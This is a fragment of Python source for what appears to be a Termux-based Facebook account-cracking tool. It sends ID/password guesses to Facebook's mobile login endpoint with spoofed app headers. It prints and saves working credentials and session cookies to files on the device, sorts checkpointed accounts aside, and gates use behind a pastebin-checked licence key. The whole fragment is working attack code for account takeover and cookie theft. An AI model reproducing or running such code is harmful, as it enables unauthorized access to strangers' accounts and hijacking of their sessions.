[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/TM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/GT-I9070;FBSV/2.3.6;FBOP/1;FBCA/armeabi-v7a:armeabi;]"%(fbpnn),
              'Content-Type': 'application/x-www-form-urlencoded', 
              'Host': 'graph.facebook.com', 
              'X-FB-Net-HNI': str(random.randint(10000,99999)), 
              'X-FB-SIM-HNI': str(random.randint(10000,99999)), 
              'X-FB-Connection-Type': 'MOBILE.LTE',
              'X-Tigon-Is-Retry': 'False',
              'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 
              'x-fb-device-group': str(random.randint(1000,9999)),
              'X-FB-Friendly-Name': 'ViewerReactionsMutation',  
              'X-FB-Request-Analytics-Tags': 'graphservice', 
              'X-FB-HTTP-Engine': 'Liger', 
              'X-FB-Client-IP': 'True', 
              'X-FB-Server-Cluster': 'True', 
              'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
              
            }
            url='https://b-graph.facebook.com/auth/login'
            req=requests.post(url,data=data,headers=headers).json()
            if 'session_key' in req:
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                print('\r\r \033[1;33m[FB-LINK] \033[1;34mhttps://www.facebook.com/'+ids)
                print('\033[1;32m [COOKIES] \033[1;36m'+coki)
                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                open('/sdcard/DRAX-COOKIES.txt','a').write(ids+" >> "+pas+" >> "+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                #print('\r\r\033[1;31m [CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
ah="xD4RK-"
imt="-M4786=="
ak=" DR4X-"
myid=uuid.uuid4().hex[:10].upper()

try:
  key1=open('/data/data/com.termux/files/usr/bin/.exca.txt', 'r').read()
except:
  kok=open('/data/data/com.termux/files/usr/bin/.exca.txt', 'w')
  kok.write(myid+imt)
  kok.close()
async def key():
  #r1=str(urlopen("https://pastebin.com/raw/zg0D9N7Y").read())
  key1=open('/data/data/com.termux/files/usr/bin/.exca.txt', 'r').read()
  clear()
  logo()
  async with aiohttp.ClientSession() as sess:
    async with sess.get('https://pastebin.com/raw/hnHX2J8B') as appro:
      r1 = await appro.text()
      if key1 in r1:
        os.system('clear')
        rprint("{}Your Key Is Approved[/]".format(g))
        sp(3)
        main()
      else:
        os.system("clear")
        print("\t \033[1;32m First Get Approval\033[1;37m ")
        time.sleep(5)
        os.system("clear")
        logo()
        print ("")
        print(" YOU HAVE TO GET APPROVE FIRST BEFORE USING IT")
        print ("")
        print(" Your Key is Not Approved ")
        print("")
        print (" Your Key : "+ak+ah+key1 )
        print ("")
        input(" Press Enter To Send Key")
        time.sleep(3.5)
        os.system('xdg-open https://www.messenger.com/t/100065316414713')
#end
main()
#asyncio.run(key())
